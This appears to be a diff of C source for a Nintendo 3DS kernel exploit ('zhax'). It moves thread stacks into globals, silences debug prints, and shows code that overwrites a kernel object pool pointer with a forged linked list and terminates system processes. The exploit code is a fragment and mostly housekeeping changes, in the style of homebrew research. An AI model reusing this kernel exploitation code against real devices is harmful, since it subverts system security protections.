@@ -29,6 +29,10 @@ vu32 val_objptr = 0;
 vu32 val_next = 0;
 vu32 val_prev = 0;
 
+Handle wait_thread_handles[16] = {0};
+#define num_wait_threads (sizeof(wait_thread_handles) / sizeof(wait_thread_handles[0]))
+void* wait_thread_stacks[num_wait_threads];
+
 void wait_thread()
 {
 	s32 out = 0;
@@ -43,17 +47,14 @@ void ktest()
 	// wait for other thread to be ready
 	while(*(vu32*)&test_buf_mirror[0] == 0xdadadada) svcSleepThread(1 * 1000 * 1000);
 
-	printf("%08X\n", (unsigned int)_cpsr());
+	// printf("%08X\n", (unsigned int)_cpsr());
 
 	// go exploit stuff
 	{
 		// printf("test %08X\n", *(unsigned int*)0x00000000);
-		printf("sup?\n");
+		// printf("sup?\n");
 
 		svcSleepThread(1 * 1000 * 1000);
-
-		Handle thread_handles[16] = {0};
-		const int num_threads = sizeof(thread_handles) / sizeof(thread_handles[0]);
 
 		Handle wait_obj = 0;
 
@@ -63,15 +64,16 @@ void ktest()
 		int i;
 		for(i = 0; i < num_waits; i++) wait_handles[i] = wait_obj;
 
-		for(i = 0; i < num_threads; i++)
+		for(i = 0; i < num_wait_threads; i++)
 		{
-			const u32 stack_len = 0x1000;
-			u8* stack = malloc(stack_len);
+			// const u32 stack_len = 0x1000;
+			// u8* stack = malloc(stack_len);
 
-			// Result ret = svcCreateThread(&thread_handles[i], wait_thread, 0, (u32*)(stack + stack_len), 0x20, 0);
-			Result ret = svcCreateThread(&thread_handles[i], wait_thread, 0, (u32*)(stack + stack_len), 0x19, 1);
+			// Result ret = svcCreateThread(&wait_thread_handles[i], wait_thread, 0, (u32*)(stack + stack_len), 0x20, 0);
+			// Result ret = svcCreateThread(&wait_thread_handles[i], wait_thread, 0, (u32*)(stack + stack_len), 0x19, 1);
+			svcCreateThread(&wait_thread_handles[i], wait_thread, 0, wait_thread_stacks[i], 0x19, 1);
 
-			printf("thread %02d %08X %08X %08X\n", i, (unsigned int)thread_handles[i], (unsigned int)ret, (unsigned int)test_buf_mirror[2]);
+			// printf("thread %02d %08X %08X %08X\n", i, (unsigned int)wait_thread_handles[i], (unsigned int)ret, (unsigned int)test_buf_mirror[2]);
 
 			svcSleepThread(1 * 1000 * 1000);
 
@@ -79,7 +81,7 @@ void ktest()
 		}
 	}
 
-	printf("ktest done\n");
+	// printf("ktest done\n");
 
 	svcExitThread();
 }
@@ -113,9 +115,6 @@ void hello()
 	for(i = 0; i < buffer_size; i += 0xC) *(u32*)&buffer[i] = buffer_kva + i + 0xC;
 
 	*(vu32*)ll_node_kobj_pool_ptr = buffer_kva;
-
-	// // KernelSetState for firm relaunch reboot
-	// u32 val = ((u32 (*)(u32,u32,u32,u32))0xFFF15DBC)(0, 0, 0x20000002, 0x00040138);
 
 	done = 1;
 
@@ -217,6 +216,12 @@ Result zhax()
 
 	if(!ret)
 	{
+		// allocate stacks
+			int i;
+			for(i = 0; i < num_wait_threads; i++)
+			{
+				wait_thread_stacks[i] = (u8*)malloc(stack_len) + stack_len;
+			}
 		// kill all the processes (in reverse creation order)
 			NS_TerminateTitle(0x4013000002802ll, 1 * 1000 * 1000); // dlp     ; 0x25
 			NS_TerminateTitle(0x4013000002c02ll, 1 * 1000 * 1000); // nim     ; 0x24
